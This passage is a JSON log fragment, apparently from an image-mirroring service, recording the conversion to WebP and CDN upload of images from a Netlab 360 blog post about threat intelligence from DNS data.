.webp","sourceBytes":161304,"destBytes":34098,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6819,"convertSpendMs":17,"createdTime":"2020-12-01 22:49:33","host":"europe68*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013,e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"157.5 KB","destSize":"33.3 KB","compressRate":"21.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/client_ip_distr.png","sourceStatusCode":200,"destWidth":1150,"destHeight":450,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn62@2020_3/2020/12/01/14-49-43-124_76322ab59e4f75e1.webp","sourceBytes":47541,"destBytes":27926,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4003,"convertSpendMs":22,"createdTime":"2020-12-01 22:49:39","host":"us-010*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.4 KB","destSize":"27.3 KB","compressRate":"58.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/sinkhole_req_count.png","sourceStatusCode":200,"destWidth":2000,"destHeight":228,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn65@2020_3/2020/12/01/14-49-44-117_0aeb98def7049a3b.webp","sourceBytes":38958,"destBytes":18228,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":5056,"convertSpendMs":23,"createdTime":"2020-12-01 22:49:40","host":"europe-22*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"38 KB","destSize":"17.8 KB","compressRate":"46.8%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/access_curve-1.png","sourceStatusCode":200,"destWidth":1105,"destHeight":395,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn70@2020_5/2020/12/01/14-49-45-399_d11f34814035d49d.webp","sourceBytes":123176,"destBytes":27936,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6419,"convertSpendMs":24,"createdTime":"2020-12-01 22:49:40","host":"europe-60*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"120.3 KB","destSize":"27.3 KB","compressRate":"22.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/rctl_server_v2-3.png","sourceStatusCode":200,"destWidth":401,"destHeight":750,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn56@2020_3/2020/12/01/14-49-48-426_133be10fd529a6af.webp","sourceBytes":218742,"destBytes":39952,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":9448,"convertSpendMs":18,"createdTime":"2020-12-01 22:49:39","host":"us-022*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"213.6 KB","destSize":"39 KB","compressRate":"18.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/11/graph_relations_layers-3.png","sourceStatusCode":200,"destWidth":1153,"destHeight":755,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn49@2020_5/2020/12/01/14-49-57-135_7862d1b5369efe8a.webp","sourceBytes":348148,"destBytes":83112,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":16412,"convertSpendMs":56,"createdTime":"2020-12-01 22:49:42","host":"europe-56*","referer":"https://blog.netlab.360.com/use-dns-data-produce-threat-intelligence/","linkMd5ListStr":"e0bd019b8f21d510803efdf22aa1a013","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"340 KB","destSize":"81.2 KB","compressRate":"23.9%"}],"successGithubMap":{"myreaderx27":1,"myreaderx4":1,"myreaderx2":1,"myreaderx13":1,"myreaderx1":1,"myreaderx18":1},"failGithubMap":{"myreaderx23":1}}